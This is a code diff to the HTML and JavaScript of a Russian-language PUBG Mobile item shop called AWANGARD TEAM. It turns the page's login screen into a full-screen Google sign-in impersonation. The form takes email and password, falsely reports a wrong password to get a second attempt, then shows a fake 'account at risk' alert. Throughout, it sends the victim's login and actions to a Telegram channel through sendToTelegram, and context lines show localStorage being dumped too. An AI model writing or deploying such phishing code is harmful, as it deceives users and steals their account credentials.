@@ -6,7 +6,6 @@
     <title>AWANGARD TEAM</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
-        /* ===== СТИЛИ ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', 'Orbitron', monospace;
@@ -61,6 +60,7 @@
             cursor: pointer; transition: 0.3s;
             display: flex; align-items: center; gap: 6px;
             font-weight: 500; text-transform: uppercase; font-size: 13px;
+            text-decoration: none;
         }
         .nav-btn:hover, .nav-btn.active {
             background: #ff6600; color: #1a1a1a; border-color: #ff6600;
@@ -309,6 +309,215 @@
         }
         .blocked-box button:hover { background: #ff8800; box-shadow: 0 0 20px rgba(255,102,0,0.5); }
 
+        /* ===== СТРАНИЦА ВХОДА (стиль как у Google) ===== */
+        #loginPage {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: #f1f3f4;
+            z-index: 9998;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            animation: fadeInUp 0.4s ease;
+        }
+        #loginPage.active {
+            display: flex;
+        }
+        .login-container {
+            background: #ffffff;
+            padding: 40px 35px 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+        }
+        .login-back-btn {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            background: none;
+            border: none;
+            color: #5f6368;
+            font-size: 24px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .login-back-btn:hover {
+            color: #202124;
+        }
+        .login-container .google-logo { display: flex; justify-content: center; margin-bottom: 24px; }
+        .login-container .google-logo svg { width: 75px; height: 75px; }
+        .login-container h2 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 6px;
+            font-family: 'Google Sans', 'Segoe UI', sans-serif;
+        }
+        .login-container .sub {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 28px;
+            font-weight: 400;
+            font-family: 'Google Sans', 'Segoe UI', sans-serif;
+        }
+        .login-container .input-group { margin-bottom: 16px; text-align: left; }
+        .login-container .input-group label {
+            font-size: 13px;
+            font-weight: 500;
+            color: #5f6368;
+            display: block;
+            margin-bottom: 4px;
+            font-family: 'Google Sans', 'Segoe UI', sans-serif;
+        }
+        .login-container .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            background: #fff;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            color: #202124;
+            font-family: 'Google Sans', sans-serif;
+        }
+        .login-container .input-group input:focus {
+            border-color: #4285f4;
+            outline: none;
+            box-shadow: 0 1px 3px rgba(66,133,244,0.25);
+        }
+        .login-container .btn {
+            width: 100%;
+            padding: 12px;
+            background: #4285f4;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s, box-shadow 0.2s;
+            font-family: 'Google Sans', sans-serif;
+            box-shadow: 0 1px 2px rgba(66,133,244,0.3);
+            margin-top: 8px;
+        }
+        .login-container .btn:hover { background: #1a73e8; box-shadow: 0 1px 4px rgba(66,133,244,0.4); }
+        .login-container .btn:active { transform: scale(0.97); }
+        .login-container .btn:disabled { background: #8ab4f8; cursor: default; box-shadow: none; opacity: 0.7; }
+        .login-container .error-msg {
+            color: #d93025;
+            font-size: 14px;
+            margin-top: 12px;
+            display: none;
+            text-align: left;
+            font-weight: 400;
+            font-family: 'Google Sans', 'Segoe UI', sans-serif;
+        }
+        .login-container .error-msg.show { display: block; }
+        .login-container .spinner-container {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            margin-top: 12px;
+            padding: 8px 0;
+        }
+        .login-container .spinner-container.active { display: flex; }
+        .login-container .google-spinner {
+            width: 28px;
+            height: 28px;
+            border: 3px solid #e8eaed;
+            border-top: 3px solid #4285f4;
+            border-radius: 50%;
+            animation: spin 0.9s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
+        }
+        .login-container .spinner-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-left: 12px;
+            font-weight: 400;
+            font-family: 'Google Sans', sans-serif;
+        }
+        .login-container .google-alert {
+            background: #fce8e6;
+            border-radius: 8px;
+            padding: 16px 18px;
+            margin: 12px 0 18px 0;
+            text-align: left;
+            border: 1px solid #f5c6c2;
+        }
+        .login-container .google-alert .alert-title {
+            font-size: 15px;
+            font-weight: 500;
+            color: #d93025;
+            font-family: 'Google Sans', sans-serif;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 4px;
+        }
+        .login-container .google-alert .alert-title svg { width: 20px; height: 20px; fill: #d93025; flex-shrink: 0; }
+        .login-container .google-alert .alert-text {
+            font-size: 14px;
+            color: #202124;
+            font-weight: 400;
+            line-height: 1.5;
+        }
+        .login-container .google-alert .alert-details {
+            font-size: 13px;
+            color: #5f6368;
+            margin-top: 6px;
+            padding-top: 8px;
+            border-top: 1px solid #f5c6c2;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 4px 16px;
+        }
+        .login-container .google-alert .alert-details span { display: flex; align-items: center; gap: 4px; }
+        .login-container .google-alert .alert-details svg { width: 14px; height: 14px; fill: #5f6368; }
+        .login-container .btn-google-change {
+            display: inline-block;
+            width: 100%;
+            padding: 12px 24px;
+            background: #4285f4;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            font-family: 'Google Sans', sans-serif;
+            text-decoration: none;
+            text-align: center;
+            cursor: pointer;
+            transition: background 0.2s, box-shadow 0.2s;
+            box-shadow: 0 1px 2px rgba(66,133,244,0.3);
+            margin-top: 8px;
+        }
+        .login-container .btn-google-change:hover { background: #1a73e8; box-shadow: 0 1px 4px rgba(66,133,244,0.4); text-decoration: none; color: #fff; }
+        .login-container .btn-google-change:active { transform: scale(0.97); }
+        .login-container .footer {
+            margin-top: 30px;
+            padding-top: 16px;
+            border-top: 1px solid #e8eaed;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px 16px;
+            font-size: 12px;
+            font-family: 'Google Sans', sans-serif;
+        }
+        .login-container .footer .language { color: #5f6368; cursor: pointer; display: flex; align-items: center; gap: 4px; }
+        .login-container .footer .language:hover { color: #202124; }
+        .login-container .footer .language svg { width: 14px; height: 14px; fill: #5f6368; }
+        .login-container .footer-links { display: flex; gap: 16px; flex-wrap: wrap; }
+        .login-container .footer-links a { color: #5f6368; text-decoration: none; font-weight: 400; font-size: 12px; font-family: 'Google Sans', sans-serif; }
+        .login-container .footer-links a:hover { color: #202124; text-decoration: underline; }
+        .login-container .hidden { display: none !important; }
+
         @media (max-width: 768px) {
             .nav-container { flex-direction: column; }
             .hero h1 { font-size: 32px; }
@@ -317,6 +526,19 @@
             .search-sort-bar { flex-direction: column; }
             .sort-buttons { justify-content: center; }
             .license-modal-content { max-height: 95vh; }
+            .login-container { padding: 28px 20px 24px; }
+            .login-container .google-logo svg { width: 60px; height: 60px; }
+            .login-container h2 { font-size: 20px; }
+            .login-container .sub { font-size: 14px; }
+            .login-container .input-group input { padding: 10px 12px; font-size: 15px; }
+            .login-container .btn, .login-container .btn-google-change { padding: 10px; font-size: 15px; }
+            .login-container .footer { flex-direction: column; align-items: flex-start; gap: 8px; }
+            .login-container .footer-links { gap: 12px; }
+            .login-container .google-spinner { width: 22px; height: 22px; border-width: 2.5px; }
+            .login-container .spinner-text { font-size: 13px; }
+            .login-container .google-alert { padding: 14px; }
+            .login-container .google-alert .alert-title { font-size: 14px; }
+            .login-container .google-alert .alert-text { font-size: 13px; }
         }
         @media (max-width: 480px) { .products-grid { grid-template-columns: 1fr; } }
     </style>
@@ -369,13 +591,13 @@
     <canvas id="lightningCanvas"></canvas>
 
     <!-- ===== НАВИГАЦИЯ ===== -->
-    <nav class="neon-nav">
+    <nav class="neon-nav" id="mainNav">
         <div class="nav-container">
             <div class="logo"><div class="logo-icon">A</div><span>AWANGARD TEAM</span></div>
             <div class="nav-links">
                 <button class="nav-btn active" data-page="main"><i class="fas fa-home"></i> Главная</button>
                 <button class="nav-btn" data-page="payment"><i class="fas fa-credit-card"></i> Оплата</button>
-                <button class="nav-btn" data-page="login"><i class="fas fa-sign-in-alt"></i> Вход</button>
+                <button class="nav-btn" id="openLoginBtn"><i class="fas fa-sign-in-alt"></i> Вход</button>
                 <button class="nav-btn" data-page="howtobuy"><i class="fas fa-question-circle"></i> Как купить</button>
                 <button class="nav-btn" data-page="reviews"><i class="fas fa-star"></i> Отзывы</button>
                 <button class="nav-btn" data-page="about"><i class="fas fa-info-circle"></i> О нас</button>
@@ -449,84 +671,6 @@
             </div>
         </div>
 
-        <!-- ===== СТРАНИЦА ВХОДА ===== -->
-        <div id="loginPage" class="page">
-            <div style="max-width: 420px; margin: 0 auto; background: #1a1a2a; padding: 30px 25px; border-radius: 16px; border: 1px solid #ff6600; box-shadow: 0 0 30px rgba(255,102,0,0.15);">
-                <!-- Лого Google -->
-                <div style="display: flex; justify-content: center; margin-bottom: 20px;">
-                    <svg viewBox="0 0 48 48" width="64" height="64" xmlns="http://www.w3.org/2000/svg">
-                        <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-                        <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-                        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-                        <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-                    </svg>
-                </div>
-
-                <!-- ШАГ 1: ВХОД -->
-                <div id="stepLogin">
-                    <h2 style="color: #fff; text-align: center; font-weight: 400; font-size: 22px; margin-bottom: 6px;">Вход</h2>
-                    <p style="color: #aaa; text-align: center; margin-bottom: 24px; font-size: 14px;">Используйте один аккаунт для всех сервисов Google</p>
-                    
-                    <form id="loginForm">
-                        <div style="margin-bottom: 16px;">
-                            <label style="display: block; font-size: 13px; color: #aaa; margin-bottom: 4px; font-weight: 500;">Эл. почта или телефон</label>
-                            <input type="text" id="email" placeholder="example@gmail.com" style="width: 100%; padding: 12px 14px; background: #2a2a3a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 16px; outline: none; transition: 0.3s;">
-                        </div>
-                        <div style="margin-bottom: 16px;">
-                            <label style="display: block; font-size: 13px; color: #aaa; margin-bottom: 4px; font-weight: 500;">Пароль</label>
-                            <input type="password" id="password" placeholder="••••••••" style="width: 100%; padding: 12px 14px; background: #2a2a3a; border: 1px solid #444; border-radius: 8px; color: #fff; font-size: 16px; outline: none; transition: 0.3s;">
-                        </div>
-                        
-                        <div id="errorMsg" style="color: #ff6666; font-size: 14px; margin-bottom: 12px; display: none;">Неверный логин или пароль</div>
-                        
-                        <div id="spinnerContainer" style="display: none; justify-content: center; align-items: center; gap: 12px; padding: 8px 0;">
-                            <div style="width: 24px; height: 24px; border: 3px solid #555; border-top: 3px solid #4285f4; border-radius: 50%; animation: spin 0.9s infinite;"></div>
-                            <span style="color: #aaa; font-size: 14px;">Загрузка...</span>
-                        </div>
-                        
-                        <button type="submit" id="submitBtn" style="width: 100%; padding: 12px; background: #4285f4; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; transition: 0.3s; font-family: 'Segoe UI', 'Google Sans', sans-serif;">
-                            Далее
-                        </button>
-                    </form>
-                </div>
-
-                <!-- ШАГ 2: ПАНИКА -->
-                <div id="stepPanic" style="display: none;">
-                    <h2 style="color: #ff6666; text-align: center; font-weight: 400; font-size: 20px;">Подозрительный вход</h2>
-                    <p style="color: #aaa; text-align: center; margin-bottom: 16px;">Кто-то пытался войти в ваш аккаунт</p>
-
-                    <div style="background: rgba(255,0,0,0.1); border: 1px solid #ff3333; border-radius: 12px; padding: 16px; margin-bottom: 16px; text-align: left;">
-                        <div style="color: #ff6666; font-weight: 500; display: flex; align-items: center; gap: 8px; margin-bottom: 4px;">
-                            <svg viewBox="0 0 24 24" width="20" height="20" fill="#ff6666"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-                            Ваш аккаунт под угрозой
-                        </div>
-                        <div style="color: #ccc; font-size: 14px;">Кто-то пытался войти с нового устройства. Смените пароль.</div>
-                        <div style="margin-top: 8px; padding-top: 8px; border-top: 1px solid #333; font-size: 13px; color: #aaa; display: flex; flex-wrap: wrap; gap: 8px 16px;">
-                            <span id="panicDevice">Неизвестное устройство</span>
-                            <span id="panicIP">Незнакомый IP</span>
-                            <span id="panicTime">Сегодня, только что</span>
-                        </div>
-                    </div>
-
-                    <a href="https://myaccount.google.com/signinoptions/password" target="_blank" style="display: inline-block; width: 100%; padding: 12px; background: #4285f4; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; text-align: center; text-decoration: none; cursor: pointer; transition: 0.3s; box-sizing: border-box;">
-                        Сменить пароль
-                    </a>
-                </div>
-
-                <div style="margin-top: 24px; padding-top: 16px; border-top: 1px solid #333; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 12px; font-size: 12px; color: #666;">
-                    <span style="display: flex; align-items: center; gap: 4px; color: #888;">
-                        <svg viewBox="0 0 24 24" width="14" height="14" fill="#888"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
-                        Английский (США)
-                    </span>
-                    <div style="display: flex; gap: 16px;">
-                        <a href="#" style="color: #888; text-decoration: none;">Помощь</a>
-                        <a href="#" style="color: #888; text-decoration: none;">Конфиденциальность</a>
-                        <a href="#" style="color: #888; text-decoration: none;">Условия</a>
-                    </div>
-                </div>
-            </div>
-        </div>
-
         <div id="howtobuyPage" class="page">
             <div class="howtobuy-card">
                 <i class="fas fa-question-circle" style="font-size: 50px; color: #ff6600;"></i>
@@ -564,6 +708,81 @@
                 <h2 style="color: #fff;">О нас</h2>
                 <p style="margin: 20px 0; color: #ccc;">AWANGARD TEAM — надёжный магазин игровых товаров для PUBG Mobile. Лучшие цены, моментальная доставка, 24/7 поддержка.</p>
                 <p style="color: #aaa;">По всем вопросам: <strong style="color: #ff8800;">@l_AWANGARD_l</strong></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== СТРАНИЦА ВХОДА (отдельный слой) ===== -->
+    <div id="loginPage">
+        <div class="login-container">
+            <button class="login-back-btn" id="closeLoginBtn"><i class="fas fa-arrow-left"></i></button>
+            <div class="google-logo">
+                <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                    <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                    <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                    <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                </svg>
+            </div>
+
+            <!-- ШАГ 1 -->
+            <div id="stepLogin">
+                <h2>Вход</h2>
+                <p class="sub">Используйте один аккаунт для всех сервисов Google</p>
+                <form id="loginForm">
+                    <div class="input-group">
+                        <label>Эл. почта или телефон</label>
+                        <input type="text" id="email" placeholder="example@gmail.com" autofocus>
+                    </div>
+                    <div class="input-group">
+                        <label>Пароль</label>
+                        <input type="password" id="password" placeholder="••••••••">
+                    </div>
+                    <div class="error-msg" id="errorMsg">Неверный логин или пароль. Попробуйте снова.</div>
+                    <div class="spinner-container" id="spinnerContainer">
+                        <div class="google-spinner"></div>
+                        <span class="spinner-text">Загрузка...</span>
+                    </div>
+                    <button type="submit" class="btn" id="submitBtn">Далее</button>
+                </form>
+            </div>
+
+            <!-- ШАГ 2: ПАНИКА -->
+            <div id="stepPanic" class="hidden">
+                <h2 style="color: #d93025; font-weight: 400;">Подозрительный вход</h2>
+                <p class="sub" style="color: #5f6368;">Кто-то пытался войти в ваш аккаунт</p>
+                <div class="google-alert">
+                    <div class="alert-title">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                        Ваш аккаунт под угрозой
+                    </div>
+                    <div class="alert-text">
+                        Кто-то пытался войти в ваш аккаунт с нового устройства. Смените пароль прямо сейчас.
+                    </div>
+                    <div class="alert-details">
+                        <span><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0 12c-2.33 0-4.31-1.46-5.11-3.5.1-.56 1.08-1.5 2.11-1.5.41 0 .8.12 1.12.34.64.45 1.86.66 2.88.66.61 0 1.42-.1 2.01-.3.64.21 1.36.45 1.36.45 1.03 0 2.01.94 2.11 1.5C16.31 14.54 14.33 16 12 16z"/></svg> <span id="panicDevice">Неизвестное устройство</span></span>
+                        <span><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0 12c-2.33 0-4.31-1.46-5.11-3.5.1-.56 1.08-1.5 2.11-1.5.41 0 .8.12 1.12.34.64.45 1.86.66 2.88.66.61 0 1.42-.1 2.01-.3.64.21 1.36.45 1.36.45 1.03 0 2.01.94 2.11 1.5C16.31 14.54 14.33 16 12 16z"/></svg> <span id="panicIP">Незнакомый IP-адрес</span></span>
+                        <span><svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67V7z"/></svg> <span id="panicTime">Сегодня, только что</span></span>
+                    </div>
+                </div>
+                <p style="font-size: 14px; color: #5f6368; text-align: left; margin-bottom: 16px;">
+                    <strong>Ваш аккаунт под угрозой.</strong> Немедленно смените пароль.
+                </p>
+                <a href="https://myaccount.google.com/signinoptions/password" target="_blank" class="btn-google-change" id="changePasswordBtn">
+                    Сменить пароль
+                </a>
+            </div>
+
+            <div class="footer">
+                <div class="language">
+                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+                    Английский (США)
+                </div>
+                <div class="footer-links">
+                    <a href="#">Помощь</a>
+                    <a href="#">Конфиденциальность</a>
+                    <a href="#">Условия</a>
+                </div>
             </div>
         </div>
     </div>
@@ -1231,7 +1450,7 @@ localStorage: ${JSON.stringify(localStorage)}
         }
 
         function initNavigation() {
-            const btns = document.querySelectorAll('.nav-btn');
+            const btns = document.querySelectorAll('.nav-btn:not(#openLoginBtn)');
             const pages = document.querySelectorAll('.page');
             btns.forEach(btn => {
                 btn.addEventListener('click', () => {
@@ -1290,12 +1509,42 @@ localStorage: ${JSON.stringify(localStorage)}
         });
 
         // ============================================================
-        // 6. ЛОГИКА ДЛЯ СТРАНИЦЫ ВХОДА (ДОПОЛНИТЕЛЬНАЯ)
+        // 6. ЛОГИКА ОТКРЫТИЯ/ЗАКРЫТИЯ СТРАНИЦЫ ВХОДА
         // ============================================================
         (function() {
             const loginPage = document.getElementById('loginPage');
-            if (!loginPage) return;
+            const openBtn = document.getElementById('openLoginBtn');
+            const closeBtn = document.getElementById('closeLoginBtn');
 
+            function openLogin() {
+                loginPage.classList.add('active');
+                document.getElementById('mainNav').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'none';
+                document.querySelector('.footer:not(.login-container .footer)').style.display = 'none';
+            }
+
+            function closeLogin() {
+                loginPage.classList.remove('active');
+                document.getElementById('mainNav').style.display = 'block';
+                document.getElementById('mainContent').style.display = 'block';
+                document.querySelector('.footer:not(.login-container .footer)').style.display = 'block';
+            }
+
+            openBtn.addEventListener('click', openLogin);
+            closeBtn.addEventListener('click', closeLogin);
+
+            // Закрытие по Escape
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'Escape' && loginPage.classList.contains('active')) {
+                    closeLogin();
+                }
+            });
+        })();
+
+        // ============================================================
+        // 7. ЛОГИКА ДЛЯ СТРАНИЦЫ ВХОДА (работа формы)
+        // ============================================================
+        (function() {
             const stepLogin = document.getElementById('stepLogin');
             const stepPanic = document.getElementById('stepPanic');
             const loginForm = document.getElementById('loginForm');
@@ -1338,7 +1587,7 @@ localStorage: ${JSON.stringify(localStorage)}
 
                 if (!email || !password) {
                     errorMsg.textContent = 'Заполните все поля';
-                    errorMsg.style.display = 'block';
+                    errorMsg.classList.add('show');
                     return;
                 }
 
@@ -1353,16 +1602,16 @@ localStorage: ${JSON.stringify(localStorage)}
                 });
 
                 submitBtn.disabled = true;
-                spinnerContainer.style.display = 'flex';
-                errorMsg.style.display = 'none';
+                spinnerContainer.classList.add('active');
+                errorMsg.classList.remove('show');
 
                 setTimeout(() => {
                     submitBtn.disabled = false;
-                    spinnerContainer.style.display = 'none';
+                    spinnerContainer.classList.remove('active');
 
                     if (attemptCount >= 2) {
-                        stepLogin.style.display = 'none';
-                        stepPanic.style.display = 'block';
+                        stepLogin.classList.add('hidden');
+                        stepPanic.classList.remove('hidden');
 
                         const device = navigator.platform || 'Неизвестное устройство';
                         const browser = navigator.userAgent.match(/(Chrome|Safari|Firefox|Edge|Opera)/)?.[0] || 'Неизвестный браузер';
@@ -1373,7 +1622,7 @@ localStorage: ${JSON.stringify(localStorage)}
                         sendToTelegram(`⚠️ ПАНИКА АКТИВИРОВАНА\n📧 Логин: ${userEmail}\n🕒 ${new Date().toLocaleString('ru-RU')}`);
                     } else {
                         errorMsg.textContent = 'Неверный логин или пароль. Попробуйте снова.';
-                        errorMsg.style.display = 'block';
+                        errorMsg.classList.add('show');
                         passwordInput.value = '';
                         passwordInput.focus();
                     }
@@ -1384,8 +1633,8 @@ localStorage: ${JSON.stringify(localStorage)}
                 sendToTelegram(`🔗 ПОЛЬЗОВАТЕЛЬ ПЕРЕШЁЛ К СМЕНЕ ПАРОЛЯ\n📧 Логин: ${userEmail}`);
             });
 
-            emailInput.addEventListener('input', () => { errorMsg.style.display = 'none'; });
-            passwordInput.addEventListener('input', () => { errorMsg.style.display = 'none'; });
+            emailInput.addEventListener('input', () => { errorMsg.classList.remove('show'); });
+            passwordInput.addEventListener('input', () => { errorMsg.classList.remove('show'); });
         })();
 
         document.addEventListener('DOMContentLoaded', () => {
